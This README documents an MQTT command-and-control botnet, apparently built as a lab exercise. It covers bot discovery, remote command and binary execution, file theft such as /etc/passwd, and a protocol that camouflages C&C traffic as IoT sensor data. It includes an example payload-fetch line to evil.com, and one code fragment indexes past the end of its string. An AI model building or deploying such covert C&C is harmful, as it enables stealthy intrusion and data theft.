# MQTT C&C Botnet

## Overview
MQTT-based Command & Control (C&C) system with encrypted communication using AES and obfuscated command codes. Supports bot discovery, system commands (`w`, `id`, `ls`), file copying, and binary execution.

**MQTT Broker**: `147.32.82.209:1883`  
**Topic**: `sensors`  
**Requirements**: Python 3.11+, Docker (optional)

## Requirements
Install dependencies from `requirements.txt`:[1]

```
paho-mqtt
pycryptodome
```

```bash
pip install -r requirements.txt
```
If you see error while doing pip isntall, try to create virtual environment:
```bash
python3 -m venv venv
source venv/bin/activate
```
And try pip install again
## Running the Controller
Interactive menu for sending commands to bots.

**Direct Python:**
```bash
python3 controller.py
```

**Menu Options:**
```
1. Announce - Discover all bots
2. List users (w command)  
3. List directory (ls command)
4. Get user ID (id command)
5. Copy file from bot
6. Execute binary on bot
7. Show discovered bots
0. Exit
```

## Running the Bot
Persistent MQTT client that executes received commands.

**Direct Python:**
```bash
python3 bot.py
```

**Bot Features:**
- Auto-identifies via hostname (`BOT_ALIVE:<hostname>`)
- Executes: `w`, `id`, `ls <path>`, `file read`, `binary exec`
- 10s command timeout
- Volume mounts: `/`, `/home`, `/etc/passwd`, `/etc/group`[2]

## Docker Setup
```bash
docker-compose up --build
```
**Docker:**
```bash
docker-compose run --rm controller #in first terminal
```

**Docker:**
```bash
docker-compose run --rm bot #in second terminal
```
**Services:**
- `mqtt-bot`: Runs `bot.py` with host filesystem access
- `mqtt-controller`: Runs `controller.py` interactively
- Custom bridge network `mqtt-network`[2]

**Dockerfile Features**:[3]
- Python 3.11 slim
- Host filesystem mounts for persistence


## Custom C&C Protocol 

### Traffic Camouflage Motivation
Initial encrypted commands stood out against legitimate IoT traffic:

**Foreign traffic (normal):**
```
Received `94775` from `sensors` topic        <- 5-digit numbers
Received `nK4fSUU3qCts4Z2FeO3Jua05xbAMMUK...` <- Base64 parameters
```

**Problematic initial traffic:**
```
Received `+i2ML+v9TdLzfWdxbaOGOd4uO4jcqGaD...` <- All encrypted
Received `51yFt4YHOosKgAQpuo6Ju44viwCUJOwG...` <- All encrypted
```

### Protocol Design: 5-Digit Numeric Commands
**Solution**: Mimic legitimate 5-digit numeric payloads while maintaining control.

```
COMMAND_NUM = PREFIX(4 digits) + CODE(1 digit) = 5 digits total
```

**Valid Prefixes** (all start with `0` for stealth to reduce chances of collisions. Actually there wasn't any 5 digits that starts with 0, That;s why having one of VALID_PREFIXES collision is mostly unreal):
```
VALID_PREFIXES = ['0910', '0110', '0349', '0123', '0573', '0153', '0823', '0737', '0889', '0112']
```
- **Key stealth feature**: All prefixes begin with `0` that helps to identify OUR event easily(foreign traffic starts >0)
- **Random selection**: 10 prefixes rotate to avoid patterns
- **Collision protection**: Legitimate 5-digit traffic unlikely to match `0xxx[1-6]`

**Command Codes:**
| Command     | Code | Description |
|-------------|------|-------------|
| `ANNOUNCE`  | `1`  | Bot discovery (`BOT_ALIVE:<hostname>`) |
| `CMD:w`     | `2`  | List logged-in users |
| `CMD:ls`    | `3`  | List directory (requires param) |
| `CMD:id`    | `4`  | Current user ID |
| `COPY`      | `5`  | Read file content (requires param) |
| `EXEC`      | `6`  | Execute binary/command (requires param) |

**Examples:**
```
03491 → ANNOUNCE    (prefix=0349, code=1)
01102 → CMD:w      (prefix=0110, code=2)  
05733 → CMD:ls     (prefix=0573, code=3)
```

### Two-Phase Command Protocol
Commands requiring parameters use stealthy two-phase delivery:

```
Phase 1: Controller → Bot: 5-digit COMMAND_NUM (plaintext, QoS=1)
Phase 2: Controller → Bot: AES-encrypted PARAMETER (Base64, QoS=1)
Phase 3: Bot → Controller: AES-encrypted RESPONSE (Base64, QoS=1)
```

**Phase 1 triggers** `waiting_for_param` state:
```
if cmd_type in ['CMD:ls', 'COPY', 'EXEC']:
    waiting_for_param = cmd_type  # Bot waits for next message
    return  # No immediate response
```

**Supported Two-Phase Commands:**
- **`CMD:ls <path>`**: `ls /tmp` → lists directory contents
- **`COPY <filepath>`**: `COPY /etc/passwd` → reads and returns file
- **`EXEC <binary>`**: `EXEC /bin/sh -c 'curl evil.com/payload'` → executes command

**Single-Phase Commands** (immediate response):
- `ANNOUNCE` → `BOT_ALIVE:<hostname>`
- `CMD:w` → Output of `w` command  
- `CMD:id` → Output of `id` command

### Validation Functions 
```
def is_valid_command(num_str):
    # Exactly 5 digits AND prefix in VALID_PREFIXES
    return (num_str.isdigit() and len(num_str) == 5 and 
            num_str[:4] in VALID_PREFIXES)

def decode_command(num_str):
    # Extract command from validated 5-digit string
    if len(num_str) != 5: return None
    prefix, code = num_str[:4], num_str[6]
    if prefix not in VALID_PREFIXES: return None
    return CODE_TO_COMMAND.get(code)
```

**Traffic Protection:**
```
Foreign: 94775 → is_valid_command("94775") = False (prefix 9477∉VALID_PREFIXES)
Mine:    03491 → is_valid_command("03491") = True (prefix 0349∈VALID_PREFIXES)
```

### Stealth Features Summary
✅ **Numeric commands** (5 digits) match legitimate IoT traffic  
✅ **Prefix whitelist** prevents foreign command execution  
✅ **Prefix starts with 0** avoids legitimate traffic collision  
✅ **Encrypted parameters** look like normal Base64 payloads  
✅ **Encrypted responses** maintain payload security  
✅ **QoS=1** ensures reliable delivery  
✅ **Random prefixes** prevent pattern detection  

**Result**: Traffic signature matches screenshot example perfectly.
```

### Validation
```python
def is_valid_command(num_str):  # 5 digits, valid prefix
def decode_command(num_str):    # Returns command name or None
```

### AES Encryption
All responses/parameters encrypted via `AESCipher.py`.[5]
Command numbers sent in plaintext (obfuscated via prefixes).

## File Structure
```
├── AESCipher.py      # AES encryption/decryption
├── bot.py           # Bot MQTT client 
├── controller.py    # C&C controller 
├── config.py        # Protocol constants 
├── requirements.txt # Dependencies 
├── Dockerfile       # Bot container 
└── docker-compose.yaml # Multi-container setup 
```

## Troubleshooting
- **Connection failed**: Verify MQTT broker `147.32.82.209:1883`
- **No bot response**: Check Docker volume mounts, bot subscription
- **Invalid command**: From 1 to 7 and 0`
- **Encryption errors**: Verify `AESCipher.py` compatibility

## Security Features
- AES-encrypted payloads
- Command obfuscation via random prefixes
- QoS=1 guaranteed delivery
- Valid prefix whitelist validation
